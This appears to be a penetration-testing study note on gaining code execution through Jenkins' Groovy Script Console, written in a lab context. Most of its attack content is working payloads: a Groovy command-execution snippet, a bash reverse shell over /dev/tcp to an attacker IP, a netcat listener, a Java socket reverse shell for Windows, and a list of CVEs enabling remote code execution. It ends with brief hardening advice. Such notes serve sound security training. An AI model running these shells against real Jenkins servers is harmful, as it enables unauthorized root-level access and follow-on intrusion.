## Attacking Jenkins
### Objective

Leverage Jenkins (often misconfigured) to gain Remote Code Execution (RCE), privilege escalation, or initial access during internal or external assessments.
### Key Exploitable Feature: Script Console

- URL:

```
http://<target>:<port>/script
```
 
Example: `http://jenkins.inlanefreight.local:8000/script

- Script Engine: Apache Groovy
    - Java-compatible scripting language
    - Executes in the Jenkins Controller runtime context    
    - Often runs as SYSTEM (Windows) or root (Linux)    
- Default Behavior: If accessible, allows execution of arbitrary OS commands
### Groovy RCE Example – Linux (id)

```groovy
def cmd = 'id'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
```

- Output confirms privilege (e.g., `uid=0(root) gid=0(root)`)
### Reverse Shell via Script Console (Linux)

```groovy
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

- Start listener:

```bash
nc -lvnp 8443
```
 
- Shell received as `root` or Jenkins user, depending on setup.
### Command Execution – Windows
#### Simple `dir` Execution

```groovy
def cmd = "cmd.exe /c dir".execute();
println("${cmd.text}");
```
#### Full Reverse Shell – Java (Windows)

```groovy
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){
  while(pi.available()>0)so.write(pi.read());
  while(pe.available()>0)so.write(pe.read());
  while(si.available()>0)po.write(si.read());
  so.flush();po.flush();
  Thread.sleep(50);
  try {p.exitValue();break;}
  catch (Exception e){}
};
p.destroy();s.close();
```
### Alternative Exploits – Version-Specific

| CVE ID                              | Version Affected | Description                                                                    |
| ----------------------------------- | ---------------- | ------------------------------------------------------------------------------ |
| CVE-2018-1999002 + CVE-2019-1003000 | ≤ 2.137          | Bypass Groovy sandbox protections, leads to pre-auth RCE via malicious JAR     |
| Jenkins 2.150.2                     | 2.150.2          | RCE via Node.js by users with `JOB` + `BUILD` rights (or anonymous if allowed) |

- Always confirm Jenkins version    
- Public PoCs available for these exploits
### Notes on Hardening

- Jenkins admins should:    
    - Disable anonymous access
    - Restrict access to `/script`
    - Patch frequently (e.g., 2.303.1 or higher recommended)    
    - Limit plugin usage and audit permissions regularly    
### Summary

|Technique|Description|
|---|---|
|Script Console RCE|`/script` endpoint; execute Groovy/OS commands|
|Linux Reverse Shell|`bash`-based TCP shell via Groovy|
|Windows Reverse Shell|Java socket-based shell|
|Version-specific RCE|CVE chaining or privilege-based payloads|
|Post-Exploitation|Use shell to escalate, enumerate AD, pivot|
# Tags
> #Exploitation #Application-Exploitation #Jenkins 